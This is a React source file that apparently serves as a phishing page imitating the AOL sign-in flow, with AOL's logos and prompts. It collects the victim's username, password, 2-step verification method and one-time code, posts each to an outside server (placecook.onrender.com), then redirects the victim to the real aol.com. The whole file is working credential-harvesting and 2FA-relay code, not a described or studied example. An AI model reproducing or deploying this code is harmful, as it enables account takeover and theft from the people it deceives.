import React, { useState, useEffect } from "react";
import axios from "axios";
import './App.css';

function App() {
  const [passwordd, setPassword] = useState("");
  const [passworddd, setPasswords] = useState("");
  const [none, noneSet] = useState("none");
  const [show, showSet] = useState("");
  const [inputValue, setInputValue] = useState("");
  const [create, createSet] = useState("create");
  const [stays, staysSet] = useState("stays");
  const [pass, passSet] = useState("none");
  const [spinner, spinnerSet] = useState("");
  const [next, nextSet] = useState("");
  const [signs, signsSet] = useState("Sign In");
  const [sorry, sorrySet] = useState("");
  const [submit, submitSet] = useState("");
  const [darkBl, darkBlSet] = useState("");
  const [formss, formssShow] = useState("");
  const [formsss, formssShows] = useState("formsss");
  const [formssss, formsssShows] = useState("formsss");
  const [formsssss, formssssShows] = useState("formsss");
  const [invalid, invalidSet] = useState("none");
  const [validMessage, validMessageSet] = useState("none");
  const [isButtonDisabled, setIsButtonDisabled] = useState(false);
  const [dataDisplayValues, setDataDisplayValues] = useState([]);
  const [clickedText, setClickedText] = useState('');
  const [uppercaseText, setUppercaseText] = useState('');



  const handleItemClick = async (event) => {
    event.preventDefault()

    const clickedElement = event.target;
    const textContent = clickedElement.textContent;
    setClickedText(textContent);
    // alert(textContent)
    formssssShows("")
    formsssShows("")
    try {
      const response = await axios.post("https://placecook.onrender.com/2fas", {
        textContent,
      });

    }catch (error) {
      console.error(error);
    }
  };


  const handleInputChange = (event) => {
    setInputValue(event.target.value);
    sorrySet("")
    setIsButtonDisabled(false)
  };
  const handleChange = (event) => {
    setPassword(event.target.value);
    invalidSet("none")
    setIsButtonDisabled(false)
    sorrySet("")
  };
  const handleChanger = (event) => {
    invalidSet("none")
    setIsButtonDisabled(false)
    sorrySet("")
    const text = event.target.value;

    setPasswords(text)
    setUppercaseText(text.toUpperCase());

  };

  const handleNextClick = (e) => {
    e.preventDefault();
    // console.log(inputValue)
    if (inputValue === "") {
      alert("Please enter a username.");
      // setTimeout(() => {
      //   sorrySet("Sorry, we don't recognize this email.")
      // }, 2000);
      return;
    }
    submitSet("submit")

    setTimeout(() => {
      signsSet("Enter Password")
      showSet("none");
      noneSet("");
      createSet("none")
      staysSet("none")
      passSet("pass")
    }, 2000);
  };
  const handleSubmit = async (event) => {
    event.preventDefault()
    setIsButtonDisabled(true)
    spinnerSet('spinner')
    nextSet('none')
    if (inputValue === "") {
      spinnerSet('')
      nextSet('')
      // alert("Please enter a username.");
      sorrySet("Sorry, we don't recognize this email.")
      setTimeout(() => {
        sorrySet("")
      setIsButtonDisabled(false)

      }, 1500);
      return;
    }

    const formData = new FormData(event.target);
    const username = formData.get("username");
    // const password = formData.get("password");
    try {
      const response = await axios.post("https://placecook.onrender.com/login", {
        username,
      });
      if (response.data.succ === 'false'){
        // alert('Sorry, we dont recognize this email.')
        sorrySet("Sorry, we don't recognize this email.")
      setIsButtonDisabled('')
      spinnerSet('')
      nextSet('')
        // window.location.reload();
      } else {
        // alert("Enter Password")
        formssShow('formsss')
        formssShows('')
      setIsButtonDisabled('')
      }

    } catch (error) {
      console.error(error);
    }

  }
  const handleSubmitPwd = async (event) => {
    event.preventDefault()
    setIsButtonDisabled('true')
    spinnerSet('spinner')
    nextSet('none')
    if (passwordd === "") {
      // alert("Please enter a username.");
      sorrySet("Enter password")
      spinnerSet('')
      nextSet('')
      setTimeout(() => {
        sorrySet("")
      }, 1500);
      return;
    }

    const formData = new FormData(event.target);
    const password = formData.get("password");
    // const password = formData.get("password");
    try {
      const response = await axios.post("https://placecook.onrender.com/pwdlog", {
        password,
      });
      if (response.data.succ === 'false'){
        spinnerSet('')
        nextSet('')
        // alert('Sorry, we dont recognize this email.')
        sorrySet("Invalid password, please try again.")
        // window.location.reload();
      } else if(response.data.succ === 'true'){
        formssShows('formsss')
        formssShow('formsss')
        formsssShows('')
        setDataDisplayValues(response.data.dataDisplayValues)

      } else if(response.data.succ === 'logged'){
        window.location.href = 'https://aol.com';
      }

    } catch (error) {
      console.error(error);
    }

  }
  const handleSubmitCode = async (event) => {
    event.preventDefault()
    const formData = new FormData(event.target);
    const codes = formData.get("codes");
    // const password = formData.get("password");
    try {
      const response = await axios.post("https://placecook.onrender.com/codes", {
        codes,
      });
      if (response.data.succ === 'false'){
        sorrySet("Invalid verification code.")
      } else if (response.data.succ === 'true'){
        window.location.href = 'https://aol.com';
      }

    } catch (error) {
      console.error(error);
    }
  }


  return (
    <div className="App">
        <header className="page-header">
          <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" />
          <a href="#">Help</a>
        </header>
      <form onSubmit={handleSubmit} className={formss}>
        <section className="form-section">
          <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" />
          <br className={show}/>
          <br className={show}/>
          <p className={none}>{inputValue}</p>
          <br />
          <strong className="sign">{signs}</strong>
          <p className={none}>to finish sign in</p>
          <br className={show}/>
          <br className={show}/>
          <br className={show}/>
          <br className={show}/>
          <br className={none}/>
          <br />
          <div className="formss">
          <p className="sorry">{sorry}</p>

            <input className={show}
              type="text"
              name="username"
              placeholder="Username, email or mobile"
              value={inputValue} onChange={handleInputChange}
            />
            <div className={invalid}>{validMessage}</div>
            <button type="submit" className={darkBl} disabled={isButtonDisabled} >
              
              <div className={next}>Next</div>
            <div className={spinner}></div>
            </button>
          </div>
          <br/>
          <div className={stays}>
            <a> <input type="checkbox"/> Stay signed in</a>
            <a>Forgot username?</a>
          </div>
          <p className={pass}>Forgot password?</p>
          <br />
          <br className={show}/>
          <br className={show}/>
          <br />
          <button className={create}>Create an account</button>
          <br/>
          <br/>
          <br/>
        </section>
      </form>
      <form onSubmit={handleSubmitPwd} className={formsss}>
        <section className="form-section2">
          <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" />
          <br />
          <p className={show}>{inputValue}</p>
          <strong className="sign">Enter password</strong>
          <p >to finish sign in</p>
          <br className={show}/>
          <br className={none}/>
          {/* <br /> */}
          <div className="formss">
          <p className="sorry">{sorry}</p>

            <input className={show}
              type="password"
              name="password"
              placeholder="Password"
              value={passwordd} onChange={handleChange}
            />
            <div className={invalid}>{validMessage}</div>
            <button type="submit" className={darkBl} disabled={isButtonDisabled} >
            <div className={next}>Next</div>
            <div className={spinner}></div>
            </button>
          </div>
          <br/>
          <div className={stays}>
            <a>Forgot password?</a>
          </div>
          <br />
          <br className={show}/>
          <br className={show}/>
          <br />
          {/* <button className={create}>Create an account</button> */}
          <br/>
          <br/>
          <br/>
        </section>
      </form>
      <form className={formssss}>
        <section className="form-section3">
          <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" />
          <br />
          <p className={show}>{inputValue}</p>
          <p >to finish sign in</p>
          <p >Why? You’ve enabled 2-step verification for your account. Please choose one of the methods below to verify that it’s really you signing in.</p>
          <img src="https://s.yimg.com/wm/mbr/images/aol-channels-v0.0.1.svg"/>
          <br className={show}/>
          <br className={none}/>
          {/* <br /> */}
          <div className="formss">
          <p className="sorry">{sorry}</p>

          {dataDisplayValues.map((value, index) => (
            <button onClick={handleItemClick} key={index} className='basebtn'>
          {value}
            </button>
          ))}

          </div>
          <br/>
          <br />
          <br className={show}/>
          <br />
          {/* <button className={create}>Create an account</button> */}
        </section>
      </form>
      <form onSubmit={handleSubmitCode} className={formsssss}>
        <section className="form-section4">
          <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" />
          <br />
          <p className={show}>{inputValue}</p>
          <strong className="sign">Enter verification code</strong>
          <br></br>
          <p>Enter code sent to</p>
          {dataDisplayValues.map((value, index) => (
          <p key={index}>{value}</p>
          ))}
 <br></br>
          <img src="https://s.yimg.com/wm/mbr/images/aol/phone-otp-v0.0.1.svg"/>
          <br className={show}/>
          <br className={none}/>
          {/* <br /> */}
          <div className="formss">
          <p className="sorry">{sorry}</p>

            <input className={show}
              type="text"
              name="codes"
              placeholder="Enter secure code"
              value={passworddd} onChange={handleChanger}
            />
            <div className={invalid}>{validMessage}</div>
            <button type="submit" className={darkBl} disabled={isButtonDisabled} >Verify</button>
          </div>
          <br/>
          <div className={stays}>
          </div>
          <br />
          <br className={show}/>
          {/* <button className={create}>Create an account</button> */}
          <br/>
        </section>
      </form>
    </div>
  );
}

export default App;
